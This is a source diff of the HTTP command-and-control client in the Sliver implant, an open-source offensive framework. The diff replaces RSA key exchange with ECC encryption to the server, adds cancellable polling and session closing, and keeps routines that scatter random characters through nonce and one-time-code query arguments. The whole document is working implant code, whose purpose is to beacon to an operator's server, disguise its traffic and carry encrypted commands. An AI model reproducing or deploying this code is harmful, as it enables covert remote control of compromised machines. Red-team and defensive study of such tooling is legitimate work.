@@ -21,38 +21,42 @@ package httpclient
 // {{if .Config.HTTPc2Enabled}}
 
 import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
 	"bytes"
-	"crypto/rsa"
+	"context"
 	"crypto/tls"
-	"crypto/x509"
-	"encoding/pem"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
 	insecureRand "math/rand"
-	"strings"
-
-	"sync"
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
 	"net"
 	"net/http"
 	"net/url"
+	"strings"
+	"sync"
 	"time"
 
+	"google.golang.org/protobuf/proto"
+
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
-	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
-	"google.golang.org/protobuf/proto"
 )
 
 const (
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+)
+
+var (
+	ErrClosed               = errors.New("http session closed")
+	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
 )
 
 // StartSessionHTTP - Attempts to start a session with a given address
@@ -127,8 +131,11 @@ type SliverHTTPClient struct {
 	PathPrefix string
 	Client     *http.Client
 	ProxyURL   string
-	SessionKey *cryptography.AESKey
+	SessionCtx *cryptography.CipherContext
 	SessionID  string
+	pollCancel context.CancelFunc
+	pollMutex  *sync.Mutex
+	Closed     bool
 
 	// Operating parameters
 	uri     *url.URL
@@ -137,21 +144,15 @@ type SliverHTTPClient struct {
 
 // SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
-	publicKey := s.getPublicKey()
-	if publicKey == nil {
-		// {{if .Config.Debug}}
-		log.Printf("Invalid public key")
-		// {{end}}
-		return errors.New("{{if .Config.Debug}}Invalid public key{{end}}")
-	}
-	sKey := cryptography.RandomAESKey()
-	s.SessionKey = &sKey
+	sKey := cryptography.RandomKey()
+	s.SessionCtx = cryptography.NewCipherContext(sKey)
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
-	encryptedSessionInit, err := cryptography.RSAEncrypt(data, publicKey)
+
+	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("RSA encrypt failed %v", err)
+		log.Printf("Nacl encrypt failed %v", err)
 		// {{end}}
 		return err
 	}
@@ -160,6 +161,36 @@ func (s *SliverHTTPClient) SessionInit() error {
 		return err
 	}
 	return nil
+}
+
+// NonceQueryArgument - Adds a nonce query argument to the URL
+func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
+	values := uri.Query()
+	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	argValue := fmt.Sprintf("%d", value)
+	for i := 0; i < insecureRand.Intn(3); i++ {
+		index := insecureRand.Intn(len(argValue))
+		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		argValue = argValue[:index] + char + argValue[index:]
+	}
+	values.Add(string(key), argValue)
+	uri.RawQuery = values.Encode()
+	return uri
+}
+
+// OTPQueryArgument - Adds an OTP query argument to the URL
+func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
+	values := uri.Query()
+	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	for i := 0; i < insecureRand.Intn(3); i++ {
+		index := insecureRand.Intn(len(value))
+		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		value = value[:index] + char + value[index:]
+	}
+	values.Add(string([]byte{key1, key2}), value)
+	uri.RawQuery = values.Encode()
+	return uri
 }
 
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
@@ -175,88 +206,31 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	return req
 }
 
-func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
-	values := uri.Query()
-	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	// {{if .Config.Debug}}
-	log.Printf("Encoder nonce %d", value)
-	// {{end}}
-	argValue := fmt.Sprintf("%d", value)
-	for i := 0; i < insecureRand.Intn(3); i++ {
-		index := insecureRand.Intn(len(argValue))
-		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
-		argValue = argValue[:index] + char + argValue[index:]
-	}
-	values.Add(string(key), argValue)
-	uri.RawQuery = values.Encode()
-	return uri
-}
-
-func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
-	values := uri.Query()
-	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	for i := 0; i < insecureRand.Intn(3); i++ {
-		index := insecureRand.Intn(len(value))
-		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
-		value = value[:index] + char + value[index:]
-	}
-	values.Add(string([]byte{key1, key2}), value)
-	uri.RawQuery = values.Encode()
-	return uri
-}
-
-func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
-	uri := s.keyExchangeURL()
-	nonce, encoder := encoders.RandomTxtEncoder()
-	s.NonceQueryArgument(uri, nonce)
-	otpCode := cryptography.GetOTPCode()
-	s.OTPQueryArgument(uri, otpCode)
-
-	// {{if .Config.Debug}}
-	log.Printf("[http] GET -> %s", uri)
-	// {{end}}
-
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
-	resp, err := s.Client.Do(req)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Failed to fetch server public key: %v", err)
-		// {{end}}
-		return nil
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[http] <- %d Server key response", resp.StatusCode)
-	// {{end}}
-	respData, _ := ioutil.ReadAll(resp.Body)
-	data, err := encoder.Decode(respData)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Failed to decode response: %s", err)
-		// {{end}}
-		return nil
-	}
-	pubKeyBlock, _ := pem.Decode(data)
-	if pubKeyBlock == nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Failed to parse certificate PEM")
-		// {{end}}
-		return nil
-	}
-
-	certErr := cryptography.RootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
-	if certErr == nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Got a valid public key")
-		// {{end}}
-		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
-		return cert.PublicKey.(*rsa.PublicKey)
-	}
-
-	// {{if .Config.Debug}}
-	log.Printf("[http] Invalid certificate %v", err)
-	// {{end}}
-	return nil
+// Do - Wraps http.Client.Do with a context
+func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, error) {
+	ctx, cancel := context.WithCancel(req.Context())
+	s.pollCancel = cancel
+	defer func() {
+		s.pollMutex.Lock()
+		defer s.pollMutex.Unlock()
+		if s.pollCancel != nil {
+			s.pollCancel()
+		}
+		s.pollCancel = nil
+	}()
+	done := make(chan error)
+	var resp *http.Response
+	var err error
+	go func() {
+		resp, err = s.Client.Do(req.WithContext(ctx))
+		select {
+		case <-ctx.Done():
+			done <- ctx.Err()
+		default:
+			done <- err
+		}
+	}()
+	return resp, <-done
 }
 
 // We do our own POST here because the server doesn't have the
@@ -272,24 +246,36 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
-	log.Printf("[http] POST -> %s", uri)
+	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
 	// {{end}}
 
 	resp, err := s.Client.Do(req)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] http response error: %s", err)
+		// {{end}}
 		return err
 	}
 	if resp.StatusCode != 200 {
+		// {{if .Config.Debug}}
+		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
+		// {{end}}
 		return errors.New("send failed")
 	}
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
 	data, err := encoder.Decode(respData)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] response decoder failure: %s", err)
+		// {{end}}
 		return err
 	}
-	sessionID, err := cryptography.GCMDecrypt(*s.SessionKey, data)
+	sessionID, err := s.SessionCtx.Decrypt(data)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] response decrypt failure: %s", err)
+		// {{end}}
 		return err
 	}
 	s.SessionID = string(sessionID)
@@ -299,13 +285,12 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	return nil
 }
 
-var (
-	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
-)
-
 // ReadEnvelope - Perform an HTTP GET request
 func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
-	if s.SessionID == "" || s.SessionKey == nil {
+	if s.Closed {
+		return nil, ErrClosed
+	}
+	if s.SessionID == "" {
 		return nil, errors.New("no session")
 	}
 	uri := s.pollURL()
@@ -315,7 +300,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	resp, err := s.Client.Do(req)
+	resp, err := s.DoPoll(req)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] GET failed %v", err)
@@ -344,7 +329,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 				return nil, err
 			}
 		}
-		data, err := cryptography.GCMDecrypt(*s.SessionKey, data)
+		data, err := s.SessionCtx.Decrypt(data)
 		if err != nil {
 			return nil, err
 		}
@@ -364,14 +349,26 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 
 // WriteEnvelope - Perform an HTTP POST request
 func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
+	if s.Closed {
+		return ErrClosed
+	}
 	data, err := proto.Marshal(envelope)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to encode request: %s", err)
+		// {{end}}
 		return err
 	}
-	if s.SessionID == "" || s.SessionKey == nil {
+	if s.SessionID == "" {
 		return errors.New("no session")
 	}
-	reqData, _ := cryptography.GCMEncrypt(*s.SessionKey, data)
+	reqData, err := s.SessionCtx.Encrypt(data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to encrypt request: %s", err)
+		// {{end}}
+		return err
+	}
 
 	uri := s.sessionURL()
 	nonce, encoder := encoders.RandomEncoder()
@@ -379,20 +376,70 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	reader := bytes.NewReader(encoder.Encode(reqData))
 
 	// {{if .Config.Debug}}
-	log.Printf("[http] POST -> %s", uri)
+	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
 	// {{end}}
 
 	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.Client.Do(req)
+	// {{if .Config.Debug}}
+	log.Printf("[http] POST request completed")
+	// {{end}}
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[http] POST failed %v", err)
+		log.Printf("[http] request failed %v", err)
 		// {{end}}
 		return err
 	}
-	if resp.StatusCode != 200 {
+	if resp.StatusCode != 202 {
+		// {{if .Config.Debug}}
+		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
+		// {{end}}
 		return errors.New("{{if .Config.Debug}}HTTP send failed (non-200 resp){{end}}")
 	}
+	return nil
+}
+
+func (s *SliverHTTPClient) CloseSession() error {
+	if s.Closed {
+		return nil
+	}
+	if s.SessionID == "" {
+		return errors.New("no session")
+	}
+	s.Closed = true
+
+	// Cancel any pending poll request
+	s.pollMutex.Lock()
+	defer s.pollMutex.Unlock()
+	if s.pollCancel != nil {
+		s.pollCancel()
+	}
+	s.pollCancel = nil
+
+	// Tell server session is closed
+	uri := s.closeURL()
+	nonce, _ := encoders.RandomEncoder()
+	s.NonceQueryArgument(uri, nonce)
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	// {{if .Config.Debug}}
+	log.Printf("[http] GET -> %s", uri)
+	// {{end}}
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] GET failed %v", err)
+		// {{end}}
+		return err
+	}
+	if resp.StatusCode != 202 {
+		// {{if .Config.Debug}}
+		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
+		// {{end}}
+		return errors.New("{{if .Config.Debug}}HTTP close failed (non-200 resp){{end}}")
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[http] session closed")
+	// {{end}}
 	return nil
 }
 
